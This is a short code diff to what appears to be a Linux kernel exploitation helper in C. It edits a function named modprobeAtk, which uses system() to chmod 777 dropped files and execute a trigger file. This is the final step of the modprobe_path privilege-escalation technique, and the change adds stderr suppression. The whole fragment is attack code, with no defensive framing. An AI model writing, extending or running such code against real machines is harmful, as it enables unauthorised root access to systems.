@@ -82,7 +82,7 @@ void modprobeAtk(char * path, char * cmd){
     system(buf);
     // change mode
     memset(buf,0,0x400);
-    snprintf(buf,0x400-1,"chmod 777 %s/funky_guy; chmod 777 %s/n132; %s/funky_guy;",path,path,path);
+    snprintf(buf,0x400-1,"chmod 777 %s/funky_guy; chmod 777 %s/n132; %s/funky_guy 2>%s/null;",path,path,path,path);
     system(buf);
 }
 /*
